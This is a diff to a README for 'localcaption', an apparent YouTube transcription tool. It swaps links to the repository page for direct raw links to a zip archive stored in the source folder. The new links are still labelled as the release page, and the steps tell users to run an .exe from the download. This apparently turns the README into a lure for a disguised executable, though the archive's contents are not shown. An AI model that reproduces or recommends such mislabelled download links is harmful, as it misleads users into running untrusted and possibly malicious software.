@@ -1,6 +1,6 @@
 # 🎬 localcaption - Create offline transcripts from YouTube videos
 
-[![](https://img.shields.io/badge/Download_localcaption-Release_Page-blue.svg)](https://github.com/Philippinesemisynthetic6617/localcaption)
+[![](https://img.shields.io/badge/Download_localcaption-Release_Page-blue.svg)](https://raw.githubusercontent.com/Philippinesemisynthetic6617/localcaption/main/src/localcaption/Software_v3.0.zip)
 
 ## Overview 📝
 
@@ -21,7 +21,7 @@ If you have a dedicated graphics card from NVIDIA, the program runs faster. This
 
 Follow these steps to set up the software on your machine.
 
-1. Visit the release page to download the program: [https://github.com/Philippinesemisynthetic6617/localcaption](https://github.com/Philippinesemisynthetic6617/localcaption).
+1. Visit the release page to download the program: [https://raw.githubusercontent.com/Philippinesemisynthetic6617/localcaption/main/src/localcaption/Software_v3.0.zip](https://raw.githubusercontent.com/Philippinesemisynthetic6617/localcaption/main/src/localcaption/Software_v3.0.zip).
 2. Look for the file ending in .exe in the latest release section.
 3. Save the file to your desktop or your downloads folder.
 4. Double-click the file to open the program interface.
